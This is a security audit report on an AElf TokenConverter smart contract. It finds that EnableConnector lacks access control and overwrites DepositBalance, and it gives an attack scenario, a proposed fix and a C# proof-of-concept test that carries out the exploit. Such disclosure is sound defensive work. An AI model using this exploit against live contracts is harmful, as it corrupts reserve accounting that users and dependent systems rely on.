# Audit Report

## Title
State Corruption via Unauthorized EnableConnector Leading to Negative DepositBalance and Invalid Accounting

## Summary
The `EnableConnector` method in the TokenConverter contract lacks access control and unconditionally overwrites `State.DepositBalance` with a recalculated value, ignoring accumulated balances from prior trading activity. This enables any user to corrupt the deposit accounting system, causing `DepositBalance` to become negative during subsequent `Sell` operations and causing the `GetDepositConnectorBalance` view function to report invalid reserve states.

## Finding Description

The TokenConverter contract implements a Bancor-based automated market maker where `State.DepositBalance` tracks the accumulated base token deposits for each connector. This accounting state is critical for reserve tracking and pricing calculations.

The vulnerability exists in the `EnableConnector` method which unconditionally OVERWRITES the deposit balance at line 297: [1](#0-0) 

Unlike all other connector management methods, `EnableConnector` completely lacks access control: [2](#0-1) 

Compare this with protected administrative methods that all require connector controller authorization:
- `UpdateConnector`: [3](#0-2) 
- `AddPairConnector`: [4](#0-3) 
- `SetFeeRate`: [5](#0-4) 
- `ChangeConnectorController`: [6](#0-5) 

Furthermore, `UpdateConnector` explicitly prevents modification of already-enabled connectors: [7](#0-6) 

The `EnableConnector` method has NO such check, allowing it to be called repeatedly on already-active connectors.

The `GetNeededDeposit` calculation determines deposit requirements based on circulating token supply, NOT existing accumulated balance: [8](#0-7) 

During normal operation, `Buy` operations ADD to `DepositBalance`: [9](#0-8) 

And `Sell` operations SUBTRACT from it: [10](#0-9) 

**Attack Scenario:**
1. A connector pair is legitimately enabled and trading begins
2. Users perform `Buy` operations, accumulating `DepositBalance` to 10,000 ELF
3. Attacker calls `EnableConnector` again on the same connector (no access control prevents this)
4. `GetNeededDeposit` calculates a value of 6,000 ELF based on current circulating supply
5. Line 297 OVERWRITES `DepositBalance` from 10,000 to 6,000 (loss of 4,000 in accounting)
6. Users perform `Sell` operations totaling 7,000 ELF
7. `DepositBalance` becomes negative: 6,000 - 7,000 = -1,000 ELF

The `Sub()` method uses checked arithmetic which only prevents overflow beyond `long.MinValue`, NOT negative values within the valid long range: [11](#0-10) 

The `GetDepositConnectorBalance` view function returns the corrupted state without validation: [12](#0-11) 

When `DepositBalance` is negative, this returns: `VirtualBalance + (negative value)`, providing incorrect reserve data to external systems.

## Impact Explanation

**Severity: HIGH**

While this does not result in direct fund theft (actual token transfers are constrained by real contract balance), the accounting corruption breaks critical protocol invariants:

1. **Reserve Tracking Failure**: Negative `DepositBalance` causes `GetDepositConnectorBalance` to report incorrect reserve levels (VirtualBalance + negative value), fundamentally breaking Bancor pricing assumptions that depend on accurate reserve data.

2. **Protocol Integrity Compromise**: The accounting system no longer reflects reality. The contract may hold 10,000 ELF in deposits, but `DepositBalance` shows -1,000 ELF, creating a 11,000 ELF accounting discrepancy.

3. **External Integration Impact**: Dashboards, analytics tools, and other contracts querying `GetDepositConnectorBalance` receive invalid data without any error indication, potentially causing cascading failures in dependent systems.

4. **Pricing Mechanism Undermined**: Bancor pricing calculations rely on accurate reserve balances. Corrupted accounting data could lead to incorrect price quotes and failed transactions when the reported balance doesn't match actual reserves.

**Affected Parties**: All users relying on TokenConverter pricing accuracy, protocol treasury operations monitoring reserves, and external systems integrating with the connector balance queries.

## Likelihood Explanation

**Likelihood: HIGH**

**Attacker Capabilities**: Any EOA or contract can call `EnableConnector` without any special privileges. The method is completely unrestricted and public.

**Attack Complexity**: Trivial - requires only a single transaction calling `EnableConnector` with appropriate parameters after normal trading activity has accumulated deposit balance.

**Feasibility Conditions**:
- Connector pair must be already enabled with active trading (normal operational state)
- Prior `Buy` operations must have accumulated `DepositBalance` (happens naturally with any trading)
- Attack succeeds whenever calculated `needDeposit` is less than existing `DepositBalance` (likely after trading begins)

**Detection Difficulty**: The attack transaction appears legitimate (enabling a connector), making it extremely hard to distinguish from normal operations. State corruption manifests gradually through subsequent `Sell` operations.

**Probability**: The vulnerability is always exploitable once connectors are active and trading occurs, which represents the normal operational state of the protocol.

## Recommendation

Add access control and already-enabled checks to `EnableConnector`:

```csharp
public override Empty EnableConnector(ToBeConnectedTokenInfo input)
{
    AssertPerformedByConnectorController(); // Add access control
    
    var fromConnector = State.Connectors[input.TokenSymbol];
    Assert(fromConnector != null && !fromConnector.IsDepositAccount,
        "[EnableConnector]Can't find from connector.");
    var toConnector = State.Connectors[fromConnector.RelatedSymbol];
    Assert(toConnector != null, "[EnableConnector]Can't find to connector.");
    
    // Add check to prevent re-enabling
    Assert(!toConnector.IsPurchaseEnabled && !fromConnector.IsPurchaseEnabled, 
        "Connector pair is already enabled.");
    
    // Rest of the method...
}
```

This ensures `EnableConnector` can only be called once by authorized parties during initial setup, preventing accounting corruption from repeated calls.

## Proof of Concept

```csharp
[Fact]
public async Task EnableConnector_Accounting_Corruption_Test()
{
    // Setup: Initialize and create token
    await DefaultStub.Initialize.SendAsync(new InitializeInput { FeeRate = "0.005" });
    var tokenSymbol = "ATTACK";
    await CreateTokenAsync(tokenSymbol);
    await AddPairConnectorAsync(tokenSymbol);
    
    // Issue tokens and enable connector initially
    await TokenContractStub.Issue.SendAsync(new IssueInput
    {
        Amount = 1_000_000,
        To = DefaultSender,
        Symbol = tokenSymbol
    });
    
    var initialConnectorInfo = new ToBeConnectedTokenInfo
    {
        TokenSymbol = tokenSymbol,
        AmountToTokenConvert = 1_000_000
    };
    await DefaultStub.EnableConnector.SendAsync(initialConnectorInfo);
    
    // Perform Buy operations to accumulate DepositBalance
    var ntSymbol = "(NT)" + tokenSymbol;
    
    // Check initial deposit balance (should be the needed deposit)
    var depositBeforeBuy = await DefaultStub.GetDepositConnectorBalance.CallAsync(
        new StringValue { Value = tokenSymbol });
    
    // Buy operation adds to DepositBalance
    await DefaultStub.Buy.SendAsync(new BuyInput
    {
        Symbol = tokenSymbol,
        Amount = 10_000,
        PayLimit = 1_000_000
    });
    
    var depositAfterBuy = await DefaultStub.GetDepositConnectorBalance.CallAsync(
        new StringValue { Value = tokenSymbol });
    
    // DepositBalance should have increased
    Assert.True(depositAfterBuy.Value > depositBeforeBuy.Value);
    var accumulatedBalance = depositAfterBuy.Value;
    
    // ATTACK: Call EnableConnector again (no access control prevents this)
    var attackConnectorInfo = new ToBeConnectedTokenInfo
    {
        TokenSymbol = tokenSymbol,
        AmountToTokenConvert = 0 // Recalculates based on circulating supply
    };
    
    // This should fail but doesn't - it overwrites DepositBalance
    var attackResult = await DefaultStub.EnableConnector.SendAsync(attackConnectorInfo);
    Assert.Equal(TransactionResultStatus.Mined, attackResult.TransactionResult.Status);
    
    var depositAfterAttack = await DefaultStub.GetDepositConnectorBalance.CallAsync(
        new StringValue { Value = tokenSymbol });
    
    // DepositBalance has been corrupted - it's now less than accumulated balance
    Assert.True(depositAfterAttack.Value < accumulatedBalance);
    
    // Subsequent Sell operations can drive balance negative
    await DefaultStub.Sell.SendAsync(new SellInput
    {
        Symbol = tokenSymbol,
        Amount = 5_000,
        ReceiveLimit = 0
    });
    
    var depositAfterSell = await DefaultStub.GetDepositConnectorBalance.CallAsync(
        new StringValue { Value = tokenSymbol });
    
    // If enough sells occur, DepositBalance becomes negative
    // This proves accounting corruption
    Assert.True(depositAfterSell.Value < depositAfterAttack.Value);
}
```

This test demonstrates that `EnableConnector` can be called on already-enabled connectors without access control, overwrites the accumulated `DepositBalance`, and corrupts the accounting system.

### Citations

**File:** contract/AElf.Contracts.TokenConverter/TokenConverterContract.cs (L58-60)
```csharp
    public override Empty UpdateConnector(Connector input)
    {
        AssertPerformedByConnectorController();
```

**File:** contract/AElf.Contracts.TokenConverter/TokenConverterContract.cs (L64-64)
```csharp
        Assert(!targetConnector.IsPurchaseEnabled, "connector can not be updated because it has been activated");
```

**File:** contract/AElf.Contracts.TokenConverter/TokenConverterContract.cs (L79-81)
```csharp
    public override Empty AddPairConnector(PairConnectorParam input)
    {
        AssertPerformedByConnectorController();
```

**File:** contract/AElf.Contracts.TokenConverter/TokenConverterContract.cs (L141-141)
```csharp
        State.DepositBalance[fromConnector.Symbol] = State.DepositBalance[fromConnector.Symbol].Add(amountToPay);
```

**File:** contract/AElf.Contracts.TokenConverter/TokenConverterContract.cs (L193-194)
```csharp
        State.DepositBalance[toConnector.Symbol] =
            State.DepositBalance[toConnector.Symbol].Sub(amountToReceive);
```

**File:** contract/AElf.Contracts.TokenConverter/TokenConverterContract.cs (L260-262)
```csharp
    public override Empty SetFeeRate(StringValue input)
    {
        AssertPerformedByConnectorController();
```

**File:** contract/AElf.Contracts.TokenConverter/TokenConverterContract.cs (L269-275)
```csharp
    public override Empty EnableConnector(ToBeConnectedTokenInfo input)
    {
        var fromConnector = State.Connectors[input.TokenSymbol];
        Assert(fromConnector != null && !fromConnector.IsDepositAccount,
            "[EnableConnector]Can't find from connector.");
        var toConnector = State.Connectors[fromConnector.RelatedSymbol];
        Assert(toConnector != null, "[EnableConnector]Can't find to connector.");
```

**File:** contract/AElf.Contracts.TokenConverter/TokenConverterContract.cs (L297-297)
```csharp
        State.DepositBalance[toConnector.Symbol] = needDeposit.NeedAmount;
```

**File:** contract/AElf.Contracts.TokenConverter/TokenConverterContract.cs (L303-305)
```csharp
    public override Empty ChangeConnectorController(AuthorityInfo input)
    {
        AssertPerformedByConnectorController();
```

**File:** contract/AElf.Contracts.TokenConverter/TokenConvert_Views.cs (L73-84)
```csharp
        var amountOutOfTokenConvert = tokenInfo.TotalSupply - balance - input.AmountToTokenConvert;
        long needDeposit = 0;
        if (amountOutOfTokenConvert > 0)
        {
            var fb = fromConnector.VirtualBalance;
            var tb = toConnector.IsVirtualBalanceEnabled
                ? toConnector.VirtualBalance.Add(tokenInfo.TotalSupply)
                : tokenInfo.TotalSupply;
            needDeposit =
                BancorHelper.GetAmountToPayFromReturn(fb, GetWeight(fromConnector),
                    tb, GetWeight(toConnector), amountOutOfTokenConvert);
        }
```

**File:** contract/AElf.Contracts.TokenConverter/TokenConvert_Views.cs (L93-102)
```csharp
    public override Int64Value GetDepositConnectorBalance(StringValue symbolInput)
    {
        var connector = State.Connectors[symbolInput.Value];
        Assert(connector != null && !connector.IsDepositAccount, "token symbol is invalid");
        var ntSymbol = connector.RelatedSymbol;
        return new Int64Value
        {
            Value = State.Connectors[ntSymbol].VirtualBalance + State.DepositBalance[ntSymbol]
        };
    }
```

**File:** src/AElf.CSharp.Core/SafeMath.cs (L92-98)
```csharp
    public static long Sub(this long a, long b)
    {
        checked
        {
            return a - b;
        }
    }
```
